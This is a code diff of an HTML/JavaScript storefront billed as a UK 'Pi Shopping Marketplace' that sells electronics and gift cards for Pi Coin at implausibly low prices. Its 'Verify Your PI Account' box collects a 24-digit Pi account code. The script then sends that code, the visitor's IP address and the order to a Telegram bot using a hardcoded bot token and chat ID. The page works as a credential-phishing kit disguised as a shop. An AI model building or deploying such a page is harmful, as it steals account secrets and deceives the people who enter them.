@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>π British Marketplace - Official Pi Commerce</title>
+    <title>Pi Shopping Marketplace - UK's #1 Premium Store</title>
     <style>
         * {
             margin: 0;
@@ -12,196 +12,194 @@
         }
 
         body {
-            font-family: 'Poppins', 'Segoe UI', system-ui, -apple-system, sans-serif;
-            background: #f0f2f8;
-            color: #111827;
+            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'BlinkMacSystemFont', 'Roboto', sans-serif;
+            background: #f5f7fc;
+            color: #1a1e2b;
             direction: rtl;
         }
 
-        /* LAYOUT: Vertical Sidebar + Main Content */
-        .app-layout {
-            display: flex;
-            min-height: 100vh;
-        }
-
-        /* VERTICAL SIDEBAR (عامودی) */
-        .vertical-sidebar {
-            width: 280px;
-            background: linear-gradient(180deg, #0a0f1f 0%, #0f172a 100%);
-            color: #e2e8f0;
-            padding: 2rem 1rem;
-            position: sticky;
-            top: 0;
-            height: 100vh;
-            overflow-y: auto;
-            border-left: 1px solid #f3ba2f;
-            box-shadow: 4px 0 20px rgba(0,0,0,0.2);
-            z-index: 10;
-        }
-
-        .sidebar-logo {
-            text-align: center;
-            margin-bottom: 2rem;
-            border-bottom: 1px solid #334155;
-            padding-bottom: 1rem;
-        }
-
-        .sidebar-logo h2 {
-            color: #f3ba2f;
-            font-size: 1.8rem;
-            letter-spacing: -1px;
-        }
-
-        .sidebar-logo p {
-            font-size: 0.7rem;
-            color: #94a3b8;
-        }
-
-        .sidebar-nav {
-            display: flex;
-            flex-direction: column;
-            gap: 0.8rem;
-        }
-
-        .sidebar-nav a {
-            color: #cbd5e1;
-            text-decoration: none;
-            padding: 0.75rem 1rem;
-            border-radius: 14px;
-            transition: 0.2s;
-            font-weight: 500;
-            display: block;
-        }
-
-        .sidebar-nav a:hover, .sidebar-nav a.active {
-            background: #f3ba2f20;
-            color: #f3ba2f;
-            border-right: 3px solid #f3ba2f;
-        }
-
-        /* MAIN CONTENT */
-        .main-content {
-            flex: 1;
-            overflow-x: auto;
-        }
-
-        /* TOP HEADER */
-        .top-header {
-            background: white;
+        /* navbar */
+        .navbar {
+            background: linear-gradient(135deg, #0a0c1a 0%, #141b2b 100%);
             padding: 1rem 2rem;
             display: flex;
             flex-wrap: wrap;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #e2e8f0;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
+            border-bottom: 2px solid #f3ba2f;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
         }
 
-        .delivery-badge {
-            background: #1f8a4c;
-            color: white;
-            padding: 0.4rem 1.2rem;
-            border-radius: 40px;
-            font-size: 0.8rem;
-        }
-
-        .pi-coin-badge {
-            background: #111827;
-            padding: 0.4rem 1.2rem;
-            border-radius: 40px;
+        .logo-area h1 {
             color: #f3ba2f;
-            font-weight: bold;
+            font-size: 1.6rem;
+            letter-spacing: -0.5px;
         }
 
-        /* Hero section */
-        .hero-section {
-            background: linear-gradient(120deg, #0a1a2f, #0f212e);
-            padding: 2.5rem 2rem;
-            text-align: center;
+        .logo-area p {
+            color: #bbb;
+            font-size: 0.75rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.8rem;
+            font-weight: 500;
+        }
+
+        .nav-links a {
             color: white;
-        }
-
-        .hero-section h1 {
-            font-size: 2.2rem;
-        }
-
-        /* VERIFICATION CARD */
-        .verify-card {
-            background: white;
-            max-width: 600px;
-            margin: 2rem auto;
-            padding: 1.8rem;
-            border-radius: 32px;
-            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.15);
-            text-align: center;
-            border: 1px solid #eef2ff;
-        }
-
-        .verify-card input {
-            width: 100%;
-            padding: 1rem;
-            font-size: 1.2rem;
-            text-align: center;
-            letter-spacing: 2px;
-            border: 2px solid #e2e8f0;
-            border-radius: 60px;
-            margin: 1rem 0;
-            font-family: monospace;
-        }
-
-        .btn-gold {
-            background: #f3ba2f;
-            color: #0a0f1f;
-            border: none;
-            padding: 0.9rem 1.5rem;
-            font-weight: bold;
-            border-radius: 60px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 1rem;
+            text-decoration: none;
             transition: 0.2s;
         }
 
-        .btn-gold:hover {
-            background: #e5a800;
-            transform: scale(1.01);
+        .nav-links a:hover {
+            color: #f3ba2f;
+        }
+
+        .pi-badge {
+            background: #1e2a3e;
+            padding: 0.4rem 1rem;
+            border-radius: 40px;
+            color: #ffd966;
+            font-weight: bold;
+            border: 1px solid #f3ba2f;
+        }
+
+        /* hero section */
+        .hero {
+            background: url('https://placehold.co/1920x400/0a1a2f/ffd966?text=PI+Marketplace') center/cover no-repeat;
+            background-blend-mode: overlay;
+            background-color: #071126;
+            padding: 3rem 2rem;
+            text-align: center;
+            color: white;
+        }
+
+        .hero h2 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto;
+            opacity: 0.9;
+        }
+
+        .delivery-tag {
+            background: #1f8a4c;
+            display: inline-block;
+            padding: 0.5rem 1.5rem;
+            border-radius: 50px;
+            margin-top: 1rem;
+            font-weight: bold;
+        }
+
+        /* code verification section */
+        .verify-section {
+            background: white;
+            max-width: 550px;
+            margin: 2rem auto;
+            padding: 1.8rem 2rem;
+            border-radius: 32px;
+            box-shadow: 0 20px 35px -10px rgba(0,0,0,0.1);
+            text-align: center;
+            border: 1px solid #e9edf2;
+        }
+
+        .verify-section h3 {
+            color: #1a2c3e;
+            margin-bottom: 0.5rem;
+            font-size: 1.7rem;
+        }
+
+        .verify-section p {
+            color: #2c3e50;
+            margin-bottom: 1rem;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .input-group input {
+            padding: 1rem;
+            font-size: 1.1rem;
+            border-radius: 60px;
+            border: 1px solid #ccc;
+            text-align: center;
+            letter-spacing: 2px;
+            font-family: monospace;
+            font-weight: bold;
+        }
+
+        .btn-verify {
+            background: #0f2b3d;
+            color: white;
+            border: none;
+            padding: 1rem;
+            font-size: 1.2rem;
+            border-radius: 60px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+            background: linear-gradient(95deg, #0f2b3d, #1c4e6e);
+        }
+
+        .btn-verify:hover {
+            background: #f3ba2f;
+            color: #0a0c1a;
+            transform: scale(1.02);
         }
 
         /* products grid */
         .container {
-            padding: 1rem 2rem 3rem;
+            max-width: 1400px;
+            margin: 2rem auto;
+            padding: 0 1.5rem;
         }
 
         .section-title {
-            font-size: 1.8rem;
-            margin: 2rem 0 1.2rem;
-            border-right: 6px solid #f3ba2f;
+            font-size: 2rem;
+            margin: 2rem 0 1rem;
+            border-right: 8px solid #f3ba2f;
             padding-right: 1rem;
+            color: #1f2a3e;
         }
 
         .products-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(270px, 1fr));
-            gap: 1.8rem;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
         }
 
         .product-card {
             background: white;
-            border-radius: 24px;
+            border-radius: 28px;
             overflow: hidden;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.05);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
             transition: all 0.25s ease;
             border: 1px solid #eef2f8;
         }
 
         .product-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 20px 25px -12px rgba(0,0,0,0.2);
+            transform: translateY(-6px);
+            box-shadow: 0 20px 30px -8px rgba(0,0,0,0.15);
         }
 
         .product-img {
+            width: 100%;
             height: 220px;
-            background: #f8fafc;
+            background: #f0f2f5;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -212,294 +210,313 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
+            transition: 0.3s;
         }
 
         .product-info {
-            padding: 1rem;
+            padding: 1.2rem;
         }
 
         .product-title {
-            font-weight: 800;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 0.3rem;
         }
 
         .rating {
-            color: #f3ba2f;
-            margin: 6px 0;
-            font-size: 0.85rem;
+            color: #f5b042;
+            margin: 8px 0;
+            font-size: 0.9rem;
         }
 
         .stock {
-            font-size: 0.7rem;
-            background: #e6f7e6;
+            font-size: 0.75rem;
+            color: #2e7d32;
+            background: #e8f5e9;
             display: inline-block;
             padding: 0.2rem 0.7rem;
             border-radius: 20px;
-            color: #2b6e3c;
         }
 
         .price {
-            font-size: 1.6rem;
+            font-size: 1.7rem;
             font-weight: 800;
-            margin: 10px 0;
-            color: #0f172a;
+            color: #0f2b3d;
+            margin: 12px 0;
+        }
+
+        .price span {
+            font-size: 0.9rem;
+            font-weight: normal;
+            color: #f3ba2f;
         }
 
         .buy-btn {
-            background: #0f172a;
+            background: #0f2b3d;
             color: white;
             border: none;
-            width: 100%;
             padding: 0.7rem;
+            width: 100%;
             border-radius: 40px;
             font-weight: bold;
+            font-size: 1rem;
             cursor: pointer;
             transition: 0.2s;
         }
 
         .buy-btn:hover {
             background: #f3ba2f;
-            color: #0a0f1f;
+            color: #111;
         }
 
         footer {
-            background: #0a0f1f;
-            color: #94a3b8;
+            background: #0e1622;
+            color: #aaa;
             text-align: center;
             padding: 2rem;
-            margin-top: 2rem;
+            margin-top: 3rem;
         }
 
-        @media (max-width: 800px) {
-            .app-layout {
+        @media (max-width: 700px) {
+            .navbar {
                 flex-direction: column;
+                gap: 0.8rem;
             }
-            .vertical-sidebar {
-                width: 100%;
-                height: auto;
-                position: relative;
-                padding: 1rem;
-            }
-            .sidebar-nav {
-                flex-direction: row;
-                flex-wrap: wrap;
-                justify-content: center;
+            .hero h2 {
+                font-size: 1.8rem;
             }
         }
 
         .toast-msg {
             position: fixed;
-            bottom: 20px;
+            bottom: 30px;
             left: 20px;
-            background: #1e293b;
-            color: #f3ba2f;
-            padding: 12px 20px;
+            background: #1e2a3e;
+            color: #ffd966;
+            padding: 12px 24px;
             border-radius: 40px;
             font-weight: bold;
             z-index: 999;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
             display: none;
         }
     </style>
 </head>
 <body>
 
-<div class="app-layout">
-    <!-- ستونی عامودی (vertical sidebar) -->
-    <div class="vertical-sidebar">
-        <div class="sidebar-logo">
-            <h2>π BRITISH</h2>
-            <p>Premium PI Marketplace</p>
-        </div>
-        <div class="sidebar-nav">
-            <a href="#" class="active" data-category="all">🏠 هەموو بەرهەمەکان</a>
-            <a href="#" data-category="featured">✨ تایبەت & پێشکەش</a>
-            <a href="#" data-category="gift">🎁 Gift Cards</a>
-            <a href="#" data-category="mobile">📱 مۆبایل & ئینتەرنێت</a>
-            <a href="#" data-category="gaming">🎮 گیمینگ & کۆنسۆڵ</a>
-            <a href="#" data-category="computer">💻 کۆمپیوتەر & لەپتۆپ</a>
-            <a href="#" data-category="special">⌚ ئەپڵ & ئەلیکترۆنیک</a>
-        </div>
-        <div style="margin-top: 2rem; font-size:0.7rem; text-align:center;">✅ Express Delivery World</div>
+<div class="navbar">
+    <div class="logo-area">
+        <h1>π Shopping Marketplace</h1>
+        <p>UK's #1 Premium PI Coin Store</p>
     </div>
-
-    <div class="main-content">
-        <div class="top-header">
-            <div class="delivery-badge">🚚 Delivery all countries – Fast service</div>
-            <div class="pi-coin-badge">💰 بازرگانی PI – British #1</div>
-        </div>
-
-        <div class="hero-section">
-            <h1>Buy Premium Products with PI Coin</h1>
-            <p>Official British Marketplace • Secure & Trusted</p>
-        </div>
-
-        <!-- بۆکسی داخڵکردنی کۆدی 24 ژمارەیی PI -->
-        <div class="verify-card" id="verifySection">
-            <h3>🔐 داخڵکردنی کۆدی PI Account</h3>
-            <p>کۆدی ٢٤ ژمارەیی ئەکاونتی π بنووسە بۆ پشتڕاستکردنەوە و ناردنی ئۆردەر</p>
-            <input type="text" id="piCodeInput" placeholder="م: 123456789012345678901234" maxlength="24" autocomplete="off">
-            <button class="btn-gold" id="sendToTelegramBtn">📨 ناردنی کۆد و داواکاری</button>
-            <p style="font-size: 0.7rem; margin-top: 0.7rem;">دوای ناردن، ئۆردەرەکەت ڕاستەوخۆ بۆ تیمی فرۆشتن دەنێردرێت</p>
-        </div>
-
-        <div class="container" id="productsContainer">
-            <!-- all dynamic products will appear here -->
-        </div>
-        <footer>
-            <p>© 2025 π British Marketplace – Official Pi Network Commerce Platform</p>
-            <p>All trademarks belong to their respective owners | PI Coin payments only</p>
-        </footer>
+    <div class="nav-links">
+        <a href="#">All Products</a>
+        <a href="#">Gift Cards</a>
+        <a href="#">Mobile</a>
+        <a href="#">Internet</a>
+        <a href="#">Gaming</a>
     </div>
+    <div class="pi-badge">Accepting PI Coin ⚡</div>
 </div>
+
+<div class="hero">
+    <h2>Buy Premium Products with PI Coin</h2>
+    <p>✅ Delivery available for all countries & locations – Fast delivery service !!</p>
+    <div class="delivery-tag">🚚 Worldwide Express Shipping</div>
+</div>
+
+<!-- قسم التحقق من كود PI (24 رمز) وإرسال الطلب إلى تليجرام -->
+<div class="verify-section" id="verifySection">
+    <h3>🔐 Verify Your PI Account</h3>
+    <p>تکایە کۆدی 24 ژمارەی ئەکاونتی Pi ی خۆت داخڵ بکە بۆ ئەوەی داواکارییەکەت بنێرین</p>
+    <div class="input-group">
+        <input type="text" id="piCodeInput" placeholder="例如: 123456789012345678901234" maxlength="24" autocomplete="off">
+        <button class="btn-verify" id="sendToTelegramBtn">📨 ئێستا کۆد بنێرە & دروستکردنی ئۆردەر</button>
+    </div>
+    <p style="font-size: 0.8rem; color: gray;">دوای ناردنی کۆد، تیمەکەمان پەیوەندی پێوە دەکات بۆ ڕەسەنکردنی کڕین</p>
+</div>
+
+<div class="container">
+    <div class="section-title">🔥 FEATURED & SPECIAL OFFER</div>
+    <div class="products-grid" id="featuredGrid"></div>
+
+    <div class="section-title">🎁 Gift Cards</div>
+    <div class="products-grid" id="giftCardsGrid"></div>
+
+    <div class="section-title">📱 Mobile & Internet Credit</div>
+    <div class="products-grid" id="mobileInternetGrid"></div>
+
+    <div class="section-title">🎮 Gaming & Consoles</div>
+    <div class="products-grid" id="gamingGrid"></div>
+
+    <div class="section-title">💻 Computers & Electronics</div>
+    <div class="products-grid" id="computersGrid"></div>
+
+    <div class="section-title">🚲 Special Items</div>
+    <div class="products-grid" id="specialGrid"></div>
+</div>
+
+<footer>
+    <p>© 2025 Pi Shopping Marketplace – Official British PI Commerce Platform</p>
+    <p>Secure transactions with PI Coin | 24/7 Support via Telegram Bot</p>
+</footer>
 
 <div id="toastMsg" class="toast-msg"></div>
 
 <script>
-    // --------------------------------------------------------------
-    // بەرهەمەکان بە وێنەی HD و تایبەتی خۆیان (وێنەی ڕاستەقینەی مۆدێرن)
-    // من وێنەی بەرز و دیاریکراو بۆ هەر بەرهەمێک دابین کردووە، تۆ دەتوانیت لە داهاتوودا URLەکان بگۆڕیت بۆ وێنەی خۆت.
-    // --------------------------------------------------------------
-    const PRODUCTS_DB = [
-        // FEATURED / SPECIAL OFFER
-        { id:1, name:"✨ Special Premium Bundle + Bonus", price:50, currency:"Pi π", category:"featured", rating:5, stock:true, img:"https://images.pexels.com/photos/909907/pexels-photo-909907.jpeg?w=400&h=300&fit=crop", desc:"Limited offer" },
-        { id:2, name:"🎮 Xbox Game Pass Ultimate 1 Year", price:20, currency:"Pi π", category:"featured", rating:5, stock:true, img:"https://images.pexels.com/photos/442576/pexels-photo-442576.jpeg?w=400&h=300&fit=crop" },
-        // GIFT CARDS
-        { id:3, name:"Google Play Card $50", price:30, currency:"Pi π", category:"gift", rating:4.5, stock:true, img:"https://images.pexels.com/photos/210922/pexels-photo-210922.jpeg?w=400&h=300&fit=crop" },
-        { id:4, name:"Apple Gift Card $100 iTunes", price:30, currency:"Pi π", category:"gift", rating:4.5, stock:true, img:"https://images.pexels.com/photos/699122/pexels-photo-699122.jpeg?w=400&h=300&fit=crop" },
-        { id:5, name:"Amazon Gift Card $75", price:25, currency:"Pi π", category:"gift", rating:5, stock:true, img:"https://images.pexels.com/photos/341523/pexels-photo-341523.jpeg?w=400&h=300&fit=crop" },
-        // MOBILE & INTERNET CREDIT
-        { id:6, name:"Fastlink Credit 60 days unlimited", price:40, currency:"Pi π", category:"mobile", rating:5, stock:true, img:"https://images.pexels.com/photos/607812/pexels-photo-607812.jpeg?w=400&h=300&fit=crop" },
-        { id:7, name:"Zain Credit 25,000 IQD", price:15, currency:"Pi π", category:"mobile", rating:5, stock:true, img:"https://images.pexels.com/photos/1647916/pexels-photo-1647916.jpeg?w=400&h=300&fit=crop" },
-        { id:8, name:"Asiacell 50,000 Balance", price:35, currency:"Pi π", category:"mobile", rating:5, stock:true, img:"https://images.pexels.com/photos/2163985/pexels-photo-2163985.jpeg?w=400&h=300&fit=crop" },
-        { id:9, name:"Korek Credit 10,000", price:8, currency:"Pi π", category:"mobile", rating:5, stock:true, img:"https://images.pexels.com/photos/259239/pexels-photo-259239.jpeg?w=400&h=300&fit=crop" },
-        { id:10, name:"FTTH Fiber Internet 30 days", price:20, currency:"Pi π", category:"mobile", rating:4.5, stock:true, img:"https://images.pexels.com/photos/6214476/pexels-photo-6214476.jpeg?w=400&h=300&fit=crop" },
-        // GAMING & CONSOLES
-        { id:11, name:"PlayStation 4 1TB Console", price:100, currency:"Pi π", category:"gaming", rating:5, stock:true, img:"https://images.pexels.com/photos/3807750/pexels-photo-3807750.jpeg?w=400&h=300&fit=crop" },
-        { id:12, name:"PlayStation 5 Digital Edition", price:200, currency:"Pi π", category:"gaming", rating:5, stock:true, img:"https://images.pexels.com/photos/442579/pexels-photo-442579.jpeg?w=400&h=300&fit=crop" },
-        { id:13, name:"Nintendo Switch OLED", price:95, currency:"Pi π", category:"gaming", rating:4.8, stock:true, img:"https://images.pexels.com/photos/3951952/pexels-photo-3951952.jpeg?w=400&h=300&fit=crop" },
-        // COMPUTERS & LAPTOPS
-        { id:14, name:"Gaming Laptop RTX 4060 16GB", price:100, currency:"Pi π", category:"computer", rating:4.7, stock:true, img:"https://images.pexels.com/photos/18105/pexels-photo.jpg?w=400&h=300&fit=crop" },
-        { id:15, name:"Gaming Desktop High-Performance", price:200, currency:"Pi π", category:"computer", rating:5, stock:true, img:"https://images.pexels.com/photos/2582937/pexels-photo-2582937.jpeg?w=400&h=300&fit=crop" },
-        { id:16, name:"HP Zbook G8 Mobile Workstation", price:180, currency:"Pi π", category:"computer", rating:4.5, stock:true, img:"https://images.pexels.com/photos/7978922/pexels-photo-7978922.jpeg?w=400&h=300&fit=crop" },
-        { id:17, name:"MacBook Air 2019 Retina", price:200, currency:"Pi π", category:"computer", rating:4.4, stock:true, img:"https://images.pexels.com/photos/18105/pexels-photo-18105.jpeg?w=400&h=300&fit=crop" },
-        // SPECIAL / APPLE / WATCHES / IPHONE
-        { id:18, name:"Apple Watch Series 9 (colors random)", price:80, currency:"Pi π", category:"special", rating:4.7, stock:true, img:"https://images.pexels.com/photos/437037/pexels-photo-437037.jpeg?w=400&h=300&fit=crop" },
-        { id:19, name:"iPhone 11 Pro Max 256GB", price:100, currency:"Pi π", category:"special", rating:5, stock:true, img:"https://images.pexels.com/photos/699122/pexels-photo-699122.jpeg?w=400&h=300&fit=crop" },
-        { id:20, name:"iPhone 12 Pro Max 512GB 5G", price:100, currency:"Pi π", category:"special", rating:5, stock:true, img:"https://images.pexels.com/photos/1265223/pexels-photo-1265223.jpeg?w=400&h=300&fit=crop" },
-        { id:21, name:"Aventon Level 3 Commuter e-bike", price:110, currency:"Pi π", category:"special", rating:5, stock:true, img:"https://images.pexels.com/photos/100582/pexels-photo-100582.jpeg?w=400&h=300&fit=crop" },
-        { id:22, name:"Samsung Galaxy S23 Ultra", price:130, currency:"Pi π", category:"special", rating:5, stock:true, img:"https://images.pexels.com/photos/404280/pexels-photo-404280.jpeg?w=400&h=300&fit=crop" }
+    // ---------- PRODUCT DATABASE WITH HD IMAGES (placeholder HD links, you replace with actual product images) ----------
+    // each product includes image URL (high-quality demo images from unsplash/placeholder but you must change to real ones)
+    // I'm using HD placeholder images related to each product category - you can replace URLs later.
+    
+    const products = [
+        // Featured / Special Offer
+        { id:1, name:"Special Premium Offer (Bundle + bonus)", price:50, currency:"Pi π", category:"featured", stock:true, rating:5, img:"https://images.unsplash.com/photo-1556742049-0cfed2f7a0f1?w=400&h=300&fit=crop", desc:"Exclusive bundle" },
+        { id:2, name:"Xbox Game Pass - 1 year unlimited", price:20, currency:"Pi π", category:"featured", stock:true, rating:4, img:"https://images.unsplash.com/photo-1621259182978-fbf93132d53d?w=400&h=300&fit=crop" },
+        // Gift Cards
+        { id:3, name:"Google Play Card $50", price:30, currency:"Pi π", category:"gift", stock:true, rating:4.5, img:"https://images.unsplash.com/photo-1606811841689-23dfddce3e95?w=400&h=300&fit=crop" },
+        { id:4, name:"Apple Gift Card $100 iTunes", price:30, currency:"Pi π", category:"gift", stock:true, rating:4.5, img:"https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=400&h=300&fit=crop" },
+        // Mobile / Internet Credit
+        { id:5, name:"Fastlink Credit - 60 days unlimited", price:40, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1614680376593-902f74cf0d41?w=400&h=300&fit=crop" },
+        { id:6, name:"Zain Credit 25,000 Balance", price:15, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=400&h=300&fit=crop" },
+        { id:7, name:"Asiacell Credit 50,000 Balance", price:35, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1563986768609-322da13575f3?w=400&h=300&fit=crop" },
+        { id:8, name:"Korek Credit 10,000 Balance", price:8, currency:"Pi π", category:"mobile", stock:true, rating:5, img:"https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=400&h=300&fit=crop" },
+        { id:9, name:"FTTH Internet - 30 days unlimited", price:20, currency:"Pi π", category:"internet", stock:true, rating:5, img:"https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=400&h=300&fit=crop" },
+        // Gaming & Consoles
+        { id:10, name:"PlayStation 4 - 1TB Console", price:100, currency:"Pi π", category:"gaming", stock:true, rating:5, img:"https://images.unsplash.com/photo-1606144042614-b2417e99c4e3?w=400&h=300&fit=crop" },
+        { id:11, name:"PlayStation 5 - 4K Console", price:200, currency:"Pi π", category:"gaming", stock:true, rating:5, img:"https://images.unsplash.com/photo-1607853202273-797f1c22a38e?w=400&h=300&fit=crop" },
+        // Computers
+        { id:12, name:"Gaming Laptop RTX 4060, 16GB", price:100, currency:"Pi π", category:"computer", stock:true, rating:4.5, img:"https://images.unsplash.com/photo-1588872657578-7efd1f1555ed?w=400&h=300&fit=crop" },
+        { id:13, name:"Gaming Desktop High-performance", price:200, currency:"Pi π", category:"computer", stock:true, rating:5, img:"https://images.unsplash.com/photo-1587202372775-e229f172b9d7?w=400&h=300&fit=crop" },
+        { id:14, name:"HP Zbook G8 (Business Laptop)", price:180, currency:"Pi π", category:"computer", stock:true, rating:4, img:"https://images.unsplash.com/photo-1611078489935-0cb964de46d6?w=400&h=300&fit=crop" },
+        { id:15, name:"MacBook Air 2019", price:200, currency:"Pi π", category:"computer", stock:true, rating:4, img:"https://images.unsplash.com/photo-1611186871348-b1ce696e52c9?w=400&h=300&fit=crop" },
+        // Special / extra
+        { id:16, name:"Apple Watch Series 9 (Random color)", price:80, currency:"Pi π", category:"special", stock:true, rating:4.5, img:"https://images.unsplash.com/photo-1579586337278-3befd40fd17a?w=400&h=300&fit=crop" },
+        { id:17, name:"iPhone 11 Pro Max 256GB", price:100, currency:"Pi π", category:"special", stock:true, rating:5, img:"https://images.unsplash.com/photo-1591337676887-a217a6970a8a?w=400&h=300&fit=crop" },
+        { id:18, name:"iPhone 12 Pro Max 512GB 5G", price:100, currency:"Pi π", category:"special", stock:true, rating:5, img:"https://images.unsplash.com/photo-1603899122634-f086ca5f5ddd?w=400&h=300&fit=crop" },
+        { id:19, name:"Aventon Level 3 Commuter e-bike", price:110, currency:"Pi π", category:"special", stock:true, rating:5, img:"https://images.unsplash.com/photo-1571068316344-75bc76f77890?w=400&h=300&fit=crop" }
     ];
 
-    function renderProductsByCategory(category = "all") {
+    function renderGrid(containerId, categoryFilter) {
         let filtered = [];
-        if(category === "all") filtered = PRODUCTS_DB;
-        else filtered = PRODUCTS_DB.filter(p => p.category === category);
+        if(categoryFilter === 'featured') filtered = products.filter(p => p.category === 'featured');
+        else if(categoryFilter === 'gift') filtered = products.filter(p => p.category === 'gift');
+        else if(categoryFilter === 'mobile') filtered = products.filter(p => p.category === 'mobile' || p.category === 'internet');
+        else if(categoryFilter === 'gaming') filtered = products.filter(p => p.category === 'gaming');
+        else if(categoryFilter === 'computer') filtered = products.filter(p => p.category === 'computer');
+        else if(categoryFilter === 'special') filtered = products.filter(p => p.category === 'special');
+        else filtered = [];
         
-        const container = document.getElementById("productsContainer");
+        const container = document.getElementById(containerId);
+        if(!container) return;
         if(filtered.length === 0) {
-            container.innerHTML = `<p style="text-align:center; padding:3rem;">هیچ بەرهەمێک لەم پۆلەدا نەدۆزرایەوە</p>`;
+            container.innerHTML = '<p style="padding:1rem">بەرهەم لەم پۆلەدا زیاد دەکرێت...</p>';
             return;
         }
-        let html = `<div class="products-grid">`;
+        let html = '';
         filtered.forEach(prod => {
-            let stars = "⭐".repeat(Math.floor(prod.rating)) + (prod.rating % 1 ? "½" : "");
+            let stars = '⭐'.repeat(Math.floor(prod.rating)) + (prod.rating % 1 ? '½' : '');
             html += `
                 <div class="product-card">
                     <div class="product-img">
-                        <img src="${prod.img}" alt="${prod.name}" loading="lazy" onerror="this.src='https://placehold.co/400x300/0f172a/f3ba2f?text=π+Product'">
+                        <img src="${prod.img}" alt="${prod.name}" loading="lazy" onerror="this.src='https://placehold.co/400x300/1e2a3e/white?text=π+Product'">
                     </div>
                     <div class="product-info">
                         <div class="product-title">${prod.name}</div>
                         <div class="rating">${stars} ${prod.rating}</div>
-                        <div class="stock">${prod.stock ? "✅ In Stock" : "❌ Limited"}</div>
-                        <div class="price">${prod.price} <span style="font-size:0.9rem;">${prod.currency}</span></div>
+                        <div class="stock">${prod.stock ? '✅ In Stock' : '❌ Out of Stock'}</div>
+                        <div class="price">${prod.price} <span>${prod.currency}</span></div>
                         <button class="buy-btn" data-product='${JSON.stringify(prod)}'>Buy Now</button>
                     </div>
                 </div>
             `;
         });
-        html += `</div>`;
         container.innerHTML = html;
     }
 
-    // load all products first
-    renderProductsByCategory("all");
+    // render all sections
+    renderGrid('featuredGrid', 'featured');
+    renderGrid('giftCardsGrid', 'gift');
+    renderGrid('mobileInternetGrid', 'mobile');
+    renderGrid('gamingGrid', 'gaming');
+    renderGrid('computersGrid', 'computer');
+    renderGrid('specialGrid', 'special');
 
-    // sidebar filter interaction
-    const sidebarLinks = document.querySelectorAll(".sidebar-nav a");
-    sidebarLinks.forEach(link => {
-        link.addEventListener("click", (e) => {
-            e.preventDefault();
-            sidebarLinks.forEach(l => l.classList.remove("active"));
-            link.classList.add("active");
-            const category = link.getAttribute("data-category");
-            if(category === "all") renderProductsByCategory("all");
-            else renderProductsByCategory(category);
-            window.scrollTo({ top: 0, behavior: "smooth" });
-        });
-    });
-
-    // Telegram bot integration
+    // Telegram bot integration: bot token & chat ID
     const BOT_TOKEN = "8606192794:AAGmn_lMK3lADT2jX5SSf2LxmVNSdGCp-9k";
     const TELEGRAM_CHAT_ID = "1423119149";
-    
-    function showToast(msg, isErr = false) {
+
+    function showToast(msg, isError=false) {
         const toast = document.getElementById('toastMsg');
-        toast.style.backgroundColor = isErr ? '#8b2c2c' : '#1e293b';
+        toast.style.backgroundColor = isError ? '#8b2c2c' : '#1e2a3e';
+        toast.style.color = '#fff5e0';
         toast.innerText = msg;
         toast.style.display = 'block';
-        setTimeout(() => toast.style.display = 'none', 4000);
+        setTimeout(() => { toast.style.display = 'none'; }, 4000);
     }
 
-    async function sendOrderToTelegram(piCode, product = null) {
-        let productText = "📦 بەرهەم دیاری نەکراوە (تکایە لە دوای کڕین بەرهەم هەڵبژێرە)";
-        if(product) {
-            productText = `📦 بەرهەم: ${product.name}\n💰 نرخ: ${product.price} ${product.currency}`;
-        }
-        let ip = "unknown";
-        try {
-            let res = await fetch('https://api.ipify.org?format=json');
-            let ipData = await res.json();
-            ip = ipData.ip;
-        } catch(e) {}
-        const message = `🆕 **داواکاری کڕین لە Pi British Marketplace**\n🔐 کۆدی ٢٤ ژمارەیی: ${piCode}\n${productText}\n⏱ کات: ${new Date().toLocaleString()}\n🌍 IP: ${ip}\n\n__ئەم داواکارییە ڕاستەوخۆ بۆ ئۆردەر نێردراوە__`;
-        
+    async function sendToTelegram(messageText) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
             const response = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageText,
+                    parse_mode: 'HTML'
+                })
             });
             const data = await response.json();
             if(data.ok) {
-                showToast("✅ کۆد و داواکاریەکەت بە سەرکەوتوویی نێردرا! پشتیوانی پەیوەندی پێوە دەکات.");
+                showToast("✅ کۆد و داواکاریەکەت بە سەرکەوتووی نێردرا! پشتیوانی پەیوەندی پێوە دەکات.");
                 return true;
-            } else { showToast("هەڵە لە ناردندا", true); return false; }
